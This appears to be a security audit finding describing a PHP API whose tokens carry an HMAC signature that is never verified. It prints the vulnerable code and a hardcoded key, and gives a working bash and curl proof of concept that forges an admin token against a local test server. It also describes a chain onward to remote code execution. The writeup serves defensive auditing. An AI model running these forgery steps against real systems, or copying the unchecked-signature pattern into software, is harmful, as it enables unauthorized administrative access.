# 28 — Base64 API token with unverified signature

- **OWASP Top 10 (2021):** A02:2021 – Cryptographic Failures
- **Severity:** Medium
- **Difficulty:** Medium

## Where

`web/includes/auth.php:40-54`:

```php
function issue_api_token($user, $admin) {
    $payload = base64_encode(json_encode(array('user' => $user, 'admin' => $admin, 'iat' => time(), 'exp' => time() + 86400)));
    $sig = base64_encode(hash_hmac('sha256', $payload, API_TOKEN_KEY, true));
    return $payload . '.' . $sig;
}

function check_api_token($token) {
    $parts = explode('.', $token);
    if (count($parts) != 2) return null;
    $raw = base64_decode($parts[0]);
    if ($raw === false) return null;
    $data = json_decode($raw, true);
    if (!$data) return null;
    return $data;
}
```

The key is `web/includes/config.php:12`:

```php
define('API_TOKEN_KEY', 'Kx9#mP2vLq8sWz4rTn7bYc1fHd6jGe3a');
```

`web/api/v1/uplist/index.php:13-23` uses only the decoded JSON:

```php
$data = check_api_token($token);
...
if (!isset($data['admin']) || $data['admin'] != 1) { ... }
```

## How it works (root cause)

The token format looks like a signed JWT (`payload.signature`), but
`check_api_token()` never verifies the HMAC signature. Base64 is encoding, not
encryption or authentication. Any attacker can decode the payload shape and
issue their own token with `admin=1` and any arbitrary signature.

## Exploitation steps

1. Observe a token shape, or read the source.
2. Build an unsigned / forged token:

   ```bash
   PAYLOAD=$(echo -n '{"user":"admin","admin":1,"iat":1,"exp":9999999999}' | base64 -w0)
   TOKEN="${PAYLOAD}.forged"
   ```

3. Use it against the API:

   ```bash
   curl -s -H "Authorization: Bearer ${TOKEN}" \
     --data-urlencode 'path=' \
     http://127.0.0.1:8080/api/v1/uplist/index.php
   ```

## Working PoC (verified)

Forged token:

```text
eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6MSwiaWF0IjoxLCJleHAiOjk5OTk5OTk5OTl9.forged
```

Response:

```text
index.php
HTTP_CODE=200
```

A staff token is rejected:

```bash
TOKEN=$(php /tmp/opencode/mktoken.php ulla 0)
curl -s -w '\nHTTP_CODE=%{http_code}\n' \
  -H "Authorization: Bearer ${TOKEN}" \
  --data-urlencode 'path=' \
  http://127.0.0.1:8080/api/v1/uplist/index.php
# unauthorized
# HTTP_CODE=401
```

## Expected result / verification

- A token with `admin=1` is accepted even if the signature is invalid or
  forged.
- A token with `admin=0` is rejected.

## Attack chain

```
base64 payload + ignored signature
  → attacker forges admin=1 token
  → /api/v1/uplist (17) → command injection → RCE
```

## Notes

- The real HMAC key is not needed because the signature is never checked.
- This is the authentication root cause for 18 (forged admin token) and for
  the uplist RCE chain in 17.
